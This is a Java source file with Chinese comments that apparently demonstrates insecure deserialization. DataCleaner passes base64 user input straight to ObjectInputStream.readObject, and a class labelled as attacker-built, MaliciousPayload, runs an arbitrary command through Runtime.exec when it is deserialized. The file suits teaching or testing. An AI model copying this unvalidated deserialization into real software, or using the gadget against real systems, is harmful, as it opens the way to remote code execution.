import java.io.*;
import java.util.Base64;
import java.util.function.Function;

@FunctionalInterface
interface DataProcessor {
    Object process(byte[] data) throws Exception;
}

public class DataCleaner {
    public static void main(String[] args) {
        if (args.length == 0) {
            System.out.println("Usage: java DataCleaner <base64_payload>");
            return;
        }
        
        try {
            // 模拟数据清洗流程中的反序列化操作
            DataProcessor unsafeDeserializer = (data) -> {
                try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
                    return ois.readObject();
                }
            };
            
            // 解码并处理用户输入数据
            byte[] decodedData = Base64.getDecoder().decode(args[0]);
            Object result = unsafeDeserializer.process(decodedData);
            
            // 模拟清洗后输出
            System.out.println("Cleaned data: " + result.toString());
            
        } catch (Exception e) {
            System.err.println("Processing failed: " + e.getMessage());
            e.printStackTrace();
        }
    }
}

// 恶意类示例（攻击者构造）
class MaliciousPayload implements Serializable {
    private String command;
    public MaliciousPayload(String cmd) {
        this.command = cmd;
    }
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟攻击代码执行
        Runtime.getRuntime().exec(command);
    }
}